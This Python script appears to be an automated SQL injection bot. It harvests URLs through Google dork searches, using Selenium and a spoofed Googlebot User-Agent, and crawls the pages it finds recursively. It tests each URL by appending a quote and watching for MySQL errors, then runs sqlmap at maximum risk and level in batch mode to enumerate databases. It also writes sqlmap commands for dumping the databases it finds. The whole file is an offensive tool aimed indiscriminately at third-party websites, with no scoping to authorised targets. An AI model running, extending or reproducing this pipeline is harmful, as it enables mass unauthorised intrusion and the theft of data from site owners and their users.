import time
import sys
import os
import re
from random import randint
from urllib import request

#from selenium.common.exceptions import WebDriverException
from selenium.common.exceptions import TimeoutException
#from selenium.common.exceptions import NoSuchElementException
#from selenium.common.exceptions import UnexpectedAlertPresentException
#from selenium.common.exceptions import InvalidArgumentException

from selenium import webdriver
#from selenium.webdriver.chrome.options import Options
#from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchWindowException
import _thread



# DO NOT CHANGE THIS
false = 0
sql_error = 1
size_change = 2
blue_font = '\033[94m'  # getsColor
yellow_font = '\033[93m'  # testsites color
green_font = '\033[92m'  # exploit color
end_font = '\033[0m'  # end color
# CONFIGURATION FILES
sqlMapPath = ".."
priority_file = "sqlVulnerable.txt"
priority_file_lock = False
error_file = "maybeVulnerable.txt"
error_file_lock = False
sites_file = "google.txt"
recursive_sites_file = "googleRecursive.txt"
recursive_sites_file_lock = False
sites_file_lock = False
dork_list_file = "dorks.txt"
dork_list_file_lock = False
proxy_file = "proxy.txt"
proxy_file_lock = False
banning_file = "banningIA.txt"
banning_file_lock = False

firefox_driver = '/Users/s-man/Desktop/sqlBot/mac'

banned_keywords_file = "banned.txt"
banned_keywords_file_lock = False
banned_keywords = []


def getDomainName(link):
    if(link[-1] == '\n'):
        link = link[:-1]
    x = link
    x = x[x.find('//') + 2:]
    if(x.find('/') != -1):
        x = x[:x.find('/')]

    if x[0:4] == 'www.':
        x = x[4:]

    result = x[x.rfind("."):]

    x = x[0:x.rfind(".")]

    if(x.rfind(".") == -1):
        result = x + result
    else:
        result = x[x.rfind(".") + 1:] + result
    return result


def valid(link):
    if(link[-1] == '/'):
        link = link[:-1]
    banned_keywords = get_sites(banned_keywords_file, banned_keywords_file_lock)
    queue = get_sites(priority_file, priority_file_lock) + \
        get_sites(error_file, error_file_lock)
    bannedExt = [".html", ".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
    # print(link+'\n')
    for ext in bannedExt:
        if link[len(link) - len(ext):] == ext:
            print("NO : extention " + ext + " banned\n")
            return False
    if link[link.find('//') + 2:].find('/') == -1:
        print("NO : site without parameters\n")
        return False
    for keyword in banned_keywords:
        if(keyword == '' or keyword == "\n"):
            continue
        if(keyword[len(keyword) - 1] == '\n'):
            keyword = keyword[:len(keyword) - 1]
        if getDomainName(link).find(keyword) != -1:
            print("NO : " + keyword + "domain banned\n")
            return False
    for keyword in queue:
        if(keyword[len(keyword) - 1] == '\n'):
            keyword = keyword[:len(keyword) - 1]
        if getDomainName(link).find(getDomainName(keyword)) != -1:
            print("NO : " + keyword + "domain already in queue\n")
            return False

    return True


def checkExt(url):
    bannedExts = [".jpg", ".jpeg", ".png", ".pdf", ");", ".js"]
    for bannedExt in bannedExts:
        if(url.find(bannedExt + "?") != -1):

            return False
        elif(url[len(url) - len(bannedExt):] == bannedExt):

            return False
    # print("ok")
    return True


def checkExtForInjection(url):
    bannedExts = [".jpg", ".html", ".jpeg", ".png", ".pdf", ");", ".js"]
    for bannedExt in bannedExts:
        if(url.find(bannedExt + "?") != -1):
            print("no ext banned")
            return False
        elif(url[len(url) - len(bannedExt):] == bannedExt):
            print("no ext banned")
            return False
    # print("ok")
    return True


def filterListOfRecursive(liste):
    result = []
    for l in liste:
        add = True
        for valid in result:
            if getDomainName(l) == getDomainName(valid):
                add = False
                break
        if(add):
            if(l[len(l)] - 1 == '/'):
                l = l[:len(l) - 1]
            result.append(l)
    return result


def getRecursiveUrls(link, recurive_search):
    if(recurive_search == 0):
        return []
    # if(browser==0):
    #	browser = webdriver.Firefox()
    #	browser.set_page_load_timeout(15)
    text = ""
    headers = {
        'Referer': 'http://www.google.com/bot.html',
        'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
    }
    #response = requests.get('https://www.mobilefun.fr/apple/iphone-5/gadgets', headers=headers)
    try:
        print("recursive for " + link)
        req = request.Request(link, headers=headers)
        response = request.urlopen(req)
        text = response.read().decode("utf-8")
        # siteLen=len(pageSource)
    except BaseException:
        print("error opening site" + link)
        text = ""

    urls = re.findall(
        r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+',
        text)
    result = []

    urlsFiltered = [
        i for i in urls if (
            getDomainName(i) != getDomainName(link) and checkExt(i)) and not bool(
            re.match(
                r"https*:\/\/[^\/]*\/$",
                i)) and not bool(
                    re.match(
                        r"https*:\/\/[^\/]*$",
                        i))]
    # urlsFiltered=[i for i in urlsFiltered if]

    print("extracted %s filtred %s" % (str(len(urls)), str(len(urlsFiltered))))
    append_sitesOnFile(urlsFiltered, sites_file, sites_file_lock)

    for url in urlsFiltered:
        getRecursiveUrls(url, recurive_search - 1)

    #result = list( dict.fromkeys(result) )
    # return result


def extract_sites(query):
    page = 0
    results = 1
    liste = []
    browser = webdriver.Firefox()
    while results > 0:
        url = 'https://www.google.fr/search?q=%s&start=%s' % (query, page)

        try:
            browser.get(url)
            source = browser.page_source.find('g-recaptcha-response')
        except TimeoutException:
            print("Network error")
            pass
        except BaseException:
            browser.close()
            browser = webdriver.Firefox()
            browser.get(url)
            source = browser.page_source.find('g-recaptcha-response')
            pass

        while (source != -1):
            time.sleep(60)
            try:
                source = browser.page_source.find('g-recaptcha-response')
            except TimeoutException:
                print("Network error")
                pass
            except NoSuchWindowException:
                browser.close()
                browser = webdriver.Firefox()
                browser.get(url)
                source = browser.page_source.find('g-recaptcha-response')
                pass

        else:
            for site in browser.find_elements_by_class_name('r'):
                try:
                    link = site.find_element_by_tag_name(
                        'a').get_attribute('href')
                except BaseException:
                    link = "https://www.google.fr/"
                    pass
                if link[len(link) - 1] == '/':
                    link = link[0:len(link) - 1]
                # GET SITES ON SITE

                liste.append(link)

            results = len(browser.find_elements_by_class_name('r'))
            page += 10

    print("%s sites extracted \n" % str(len(liste)))
    append_sitesOnFile(liste, sites_file, sites_file_lock)
    append_sitesOnFile(liste, recursive_sites_file, recursive_sites_file_lock)
    browser.close()


def testChar(source, sizeOfOriginal):
    keywords = ['mysql', 'syntax']
    for keyword in keywords:
        if source.lower().find(keyword) != -1:
            print(keyword + " keyword found")
            return sql_error
    if abs(sizeOfOriginal - len(source)) > 100:
        print("size change")
        return size_change
    else:
        print("not vulnerable")
        return False


def testSite(site):
    if(site[-1] == '\n'):
        site = site[0:-1]

    sqlChars = ['\'']

    headers = {
        'Referer': 'http://www.google.com/bot.html',
        'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
    }
    #response = requests.get('https://www.mobilefun.fr/apple/iphone-5/gadgets', headers=headers)
    try:
        req = request.Request(site, headers=headers)
        response = request.urlopen(req)
        pageSource = response.read().decode("utf-8")
        siteLen = len(pageSource)
    except BaseException:
        print("error opening site")
        return False

    for sqlChar in sqlChars:

        result = False
        try:
            req = request.Request(site + sqlChar, headers=headers)
            response = request.urlopen(req)
            pageSource = response.read().decode("utf-8")
            result = testChar(pageSource, siteLen)

        except Exception as err:
            print("error opening site with injection char")

            return False

        if(result == sql_error or result == size_change):

            return result

    return False


def test_sites(sites_file_lock):

    lSql = []
    lError = []
    i = 0

    sitesNum = get_number(sites_file, sites_file_lock)

    while(sitesNum == 0):
        print(yellow_font + "Waiting for vulnerable sites to come\n" + end_font)
        time.sleep(60)
        sitesNum = get_number(sites_file, sites_file_lock)

    while(sitesNum > 0):
        site = get_site(sites_file, sites_file_lock)
        if(site[len(site) - 1] == '/'):
            site = site[0:len(site) - 1]
        i += 1
        print((yellow_font + "Testing site %s of %s %s" + end_font) %
              (sitesNum, str(i), site))
        if(site[-1] == '\n'):
            site = site[0:-1]
        if(checkExtForInjection(site) and valid(site)):

            res = testSite(site)
            if res == sql_error:
                print(yellow_font + "sql" + end_font)
                lSql.append(site)
                appendSiteOnFile(
                    site + "\n",
                    priority_file,
                    priority_file_lock)
            elif res == size_change:
                print(yellow_font + "maybe" + end_font)
                lError.append(site)
                appendSiteOnFile(site + "\n", error_file, error_file_lock)
        sitesNum = get_number(sites_file, sites_file_lock)
        while(sitesNum == 0):
            print(
                yellow_font +
                "Waiting for vulnerable sites to come\n" +
                end_font)
            time.sleep(60)
            sitesNum = get_number(sites_file, sites_file_lock)

    return (lSql, lError)


def get_sitesByDork(dork):
    dork = dork.replace('&', '%26')
    dork = dork.replace(' ', '+')
    extract_sites(dork)


def append_sitesOnFile(l, file, lock):

    while(lock):
        print("Waiting for %s To be unlocked" % (file))
    lock = True
    #print(str(len(l))+" have to be writed")
    #files  = open(file, "r")
    #sites =[ getDomainName(f) for f in files.readlines() if f !="\n" ]
    # files.close()
    files = open(file, "a")
    newL = []
#	for site in l:
    #	print(" %s not in sites %s"%(getDomainName(site), getDomainName(site) not in sites))
    #	print(sites)
#		if( getDomainName(site) not in sites ):
    #		sites.append(site)
    #		newL.append(site)
    #newL=[site for site in l if getDomainName(site) not in sites ]
    files.writelines('\n'.join(l))
    files.close()
    #print(str(len(newL))+" have been writed")

    lock = False


def appendSiteOnFile(site, fileName, lock):

    while(lock):
        print("waiting for %s To be Unlocked" % (file))
    lock = True

    #file  = open(fileName, "r")
    #sites =[ getDomainName(f) for f in file.readlines() if f  !="\n" ]
    # file.close()
    file = open(fileName, "a")
    # if(getDomainName(site) in sites):
    #	print("site already in file")
    # else:
    file.write('%s' % site)
    file.close()

    lock = False


def testIfBan(liste, site, banning_file_lock):
    if(site[-1] == '\n'):
        site = site[0:-1]
    numOfTests = 1
    result = False
    for siteToCheck in liste:

        if(siteToCheck.find(site) != -1):

            liste.remove(siteToCheck)
            numOfTests = int(siteToCheck.split(":")[1])
            if(numOfTests > 5):
                result = True
                print(site + " banned")
            else:
                numOfTests = numOfTests + 1

                result = False
            break
    if not result:

        liste.append(site + ":" + str(numOfTests) + "\n")
    while(banning_file_lock):
        print("waiting for %s To be Unlocked" % (banning_file))
    banning_file_lock = True

    files = open(banning_file, "w")
    files.writelines(liste)
    files.close()

    banning_file_lock = False

    return result


def filter():
    files = os.listdir("finished")
    for file in files:
        dbList = []
        if file[0] != ".":
            print("Checking file " + file, end="")
            f = open("finished/" + file, "r")
            found = False
            lines = f.readlines()
            if(len(lines) > 1):
                site = lines[0]
                if(site[-1] == "\n"):
                    site = site[:-1]
                lines = lines[1:]
            for line in lines:
                if line.find("[*] ") != -1 and line.find("[*] ending") == - \
                        1 and line.find("[*] starting") == -1:
                    dbList.append(
                        line.replace(
                            '\n', '')[
                            line.find("[*] ") + 4:])
                if line.find("fetched data logged") != -1:
                    found = True
            if not found:
                os.remove("finished/" + file)
                print("\n")
                listOfRemoved = get_sites(banning_file, banning_file_lock)

                if(testIfBan(listOfRemoved, file[:-7] + "\n", banning_file_lock)):
                    appendSiteOnFile(file[:-7] + "\n",
                                     banned_keywords_file,
                                     banned_keywords_file_lock)

            else:
                if(len(dbList) > 0):
                    print(" Found db\n")
                    with open("dbs/" + file, "w+") as result:
                        result.write(site + "\n")
                        for db in dbList:
                            result.write(
                                "python " +
                                sqlMapPath +
                                "/sqlmap/sqlmap.py -u %s --risk 3 --level 5 --batch --random-agent -D " %
                                (site,
                                 ) +
                                db +
                                "\n")
                        result.close()
                    os.remove("finished/" + file)
                else:
                    print(" Found but not db\n")
                    os.rename("finished/" + file, "maybe/" + file)

            f.close()


def get_site(fileName, lock):

    while(lock):
        print("waiting for %s To be Unlocked" % (fileName))
    lock = True

    files = open(fileName, "r")
    sites = files.readlines()
    files.close()
    site = sites[0]
    del sites[0]

    # x=input("confirmer"+str(len(sites)))

    #sites = sites[1:]

    files = open(fileName, "w")
    if(len(sites) > 0):
        files.writelines(sites)
    files.close()

    #x=input("verifier google")
    lock = False

    return site


def get_sites(fileName, lock):

    while(lock):
        print("waiting for %s To be Unlocked" % (fileName))
    lock = True

    files = open(fileName, "r")
    sites = files.readlines()

    return sites


def get_number(fileName, lock):

    while(lock):
        print("waiting for %d To be Unlocked" % (fileName))
    lock = True

    files = open(fileName, "r")
    sites = files.readlines()
    files.close()

    lock = False

    # print("sites="+str(sites)+"leen="+str(len(sites)))
    return len(sites)


def exploit(max_threads):

    priority_file_number = get_number(priority_file, priority_file_lock)

    error_file_number = get_number(error_file, error_file_lock)

    os.system("mkdir working")
    os.system("mkdir finished")
    os.system("mkdir dbs")
    os.system("mkdir maybe")
    while(priority_file_number == 0 and error_file_number == 0):
        print(green_font + "Waiting for sites to come\n" + end_font)
        time.sleep(60)

        priority_file_number = get_number(priority_file, priority_file_lock)

        error_file_number = get_number(error_file, error_file_lock)

    while priority_file_number > 0 or error_file_number > 0:

        while(get_sqlmap_threads() > max_threads):
            print(
                green_font +
                "Waiting for others to finish exploit\n" +
                end_font)
            time.sleep(100)

        else:

            if(priority_file_number > 0):
                site = get_site(priority_file, priority_file_lock)

            else:
                site = get_site(error_file, error_file_lock)

            priority_file_number = get_number(priority_file, priority_file_lock)

            error_file_number = get_number(error_file, error_file_lock)

            if(site[len(site) - 1] == '\n'):
                site = site[0:len(site) - 1]
            siteFile = getDomainName(site)
            random_int1 = randint(0, 9)
            random_int2 = randint(0, 9)
            print(
                green_font +
                "executing exploit for " +
                siteFile +
                "\n" +
                end_font)
            command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site,
                                                                                                                                                                                                                     siteFile, str(random_int1) + str(random_int2), sqlMapPath + "/sqlmap/", site, siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2), siteFile, str(random_int1) + str(random_int2))
            os.system(command)
            while(priority_file_number == 0 and error_file_number == 0):
                print(green_font + "Waiting for sites to come\n" + end_font)
                time.sleep(50)

                priority_file_number = get_number(
                    priority_file, priority_file_lock)

                error_file_number = get_number(error_file, error_file_lock)

    else:
        print(green_font + "no sites to test" + end_font)


def all(max_threads, recursive_search_number):

    _thread.start_new_thread(gets, ())
    _thread.start_new_thread(test_sites, (sites_file_lock,))
    _thread.start_new_thread(exploit, (max_threads,))
    if(recursive_search_number > 0):
        _thread.start_new_thread(recursive_search, (recursive_search_number,))

    while True:
        pass


def gets():
    print(blue_font)
    dorks_number = get_number(dork_list_file, dork_list_file_lock)
    while dorks_number == 0:
        print(blue_font + "Waiting for new dorks" + end_font)
        time.sleep(60)
        dorks_number = get_number(dork_list_file, dork_list_file_lock)
    while(dorks_number > 0):
        dork = get_site(dork_list_file, dork_list_file_lock)
        get_sitesByDork(dork)
        dorks_number = get_number(dork_list_file, dork_list_file_lock)
        while dorks_number == 0:
            print(blue_font + "Waiting for new dorks" + end_font)
            time.sleep(60)
            dorks_number = get_number(dork_list_file, dork_list_file_lock)

    print("End get dorks")


def clean():
    os.system("rm *.txt")
    os.system("rm -rf working finished dbs maybe")
    os.system("rm -rf " + sqlMapPath + "/sqlmap")


def setup():
    try:
        os.makedirs(sqlMapPath + "/sqlmap")
    except BaseException:
        pass
    os.system(
        'git clone https://github.com/sqlmapproject/sqlmap.git ' +
        sqlMapPath +
        "/sqlmap")
    try:
        os.makedirs("dbs")
    except BaseException:
        pass
    try:
        os.makedirs("maybe")
    except BaseException:
        pass
    os.system("apt install python3-pip")
    os.system("pip3 install selenium")
    os.system("apt install python")

    os.system("echo \"alias clean='python3 clean.py'\" >> ~/.bashrc ")
    os.system(
        "echo \"alias filter='zeb ; python3 extract_sites.py filter'\" >> ~/.bashrc ")
    os.system("echo \"alias lss='ls -lia'\" >> ~/.bashrc ")
    os.system("echo \"alias revnc='vncserver -kill :1 ; vncserver'\" >> ~/.bashrc ")
    os.system("echo \"alias sites='ps aux | grep sqlmap | sed -E \'/sh -c/d\' | sed -E \'/grep/d\' '\" >> ~/.bashrc ")
    os.system("echo \"alias webvnc='websockify -D --web=/usr/share/novnc/ --cert=/etc/ssl/novnc.pem 6080 localhost:5901'\" >> ~/.bashrc ")
    os.system("echo \"alias zeb='cd /root/Desktop/sqlBot'\" >> ~/.bashrc ")
    os.system(
        "echo \"export PATH=$PATH:\"%s >> ~/.bashrc " %
        (firefox_driver,))

    os.system(
        "touch " +
        priority_file +
        " " +
        error_file +
        " " +
        sites_file +
        " " +
        dork_list_file +
        " " +
        banned_keywords_file +
        " " +
        recursive_sites_file +
        " " +
        banning_file)
    #os.system("echo \"google.\" > "+banned_keywords_file)


def recursive_search(number):

    print("recurive_search")
    ready_to_check_number = get_number(sites_file, sites_file_lock)
    sites_number = get_number(recursive_sites_file, recursive_sites_file_lock)
    while sites_number == 0:
        print("Waiting for new sites for recursive_search")
        time.sleep(60)
        sites_number = get_number(
            recursive_sites_file,
            recursive_sites_file_lock)
    while ready_to_check_number > 1000:
        print("proirity to readyToCheck_sites")
        time.sleep(60)
        ready_to_check_number = get_number(sites_file, sites_file_lock)
    #recursiveBrowser = webdriver.Firefox()
    while(sites_number > 0):

        link = get_site(recursive_sites_file, recursive_sites_file_lock)

        #print("recurive_search for "+link)
        # newListe=
        getRecursiveUrls(link, number)

        ready_to_check_number = get_number(sites_file, sites_file_lock)
        sites_number = get_number(
            recursive_sites_file,
            recursive_sites_file_lock)

        # if(sites_number==0):
        # recursiveBrowser.close()
        while sites_number == 0:
            print("Waiting for new sites for recursive_search")
            time.sleep(60)
            sites_number = get_number(
                recursive_sites_file,
                recursive_sites_file_lock)
        while ready_to_check_number > 1000:
            print("proirity to readyToCheck_sites")
            time.sleep(60)
            ready_to_check_number = get_number(sites_file, sites_file_lock)
        #recursiveBrowser = webdriver.Firefox()

    print("end recurive_search")
    # recursiveBrowser.close()


def get_sqlmap_threads():
    return int(int(os.popen(
        "ps aux | grep sqlmap | sed -E '/sh -c/d' | sed -E '/grep/d' | wc -l | sed -E 's/ *//'").readline()[0:-1]))


def main():

    if(len(sys.argv) == 4 and sys.argv[1] == "get"):
        get_sitesByDork(sys.argv[2])
        if(int(sys.argv[3]) > 0):
            recursive_search(int(sys.argv[3]))
        test_sites(sites_file_lock)

    elif(len(sys.argv) == 3 and sys.argv[1] == "exploit"):
        max_threads = int(sys.argv[2])
        exploit(max_threads)

    elif(len(sys.argv) == 2 and sys.argv[1] == "filter"):
        filter()
    elif(len(sys.argv) == 3 and sys.argv[1] == "recursive_search"):
        recursive_search(int(sys.argv[2]))
    elif(len(sys.argv) == 2 and sys.argv[1] == "setup"):
        setup()
    elif(len(sys.argv) == 2 and sys.argv[1] == "clean"):
        clean()
    elif(len(sys.argv) == 3 and sys.argv[1] == "gets"):
        gets()
        if(int(sys.argv[3]) > 0):
            recursive_search(int(sys.argv[3]))
    elif(len(sys.argv) == 4 and sys.argv[1] == "all"):
        all(int(sys.argv[2]), int(sys.argv[3]))
    else:
        print("usage : " + sys.argv[0] + " get dork recursive_search\n")
        print("usage : " + sys.argv[0] + " gets recursive_search\n")
        print("usage : " + sys.argv[0] + " exploit max_threads\n")
        print("usage : " + sys.argv[0] + " filter\n")

        print("usage : " + sys.argv[0] + " recursive_search int\n")
        print("usage : " + sys.argv[0] + " setup\n")
        print("usage : " + sys.argv[0] + " all max_threads recursive_search\n")


main()
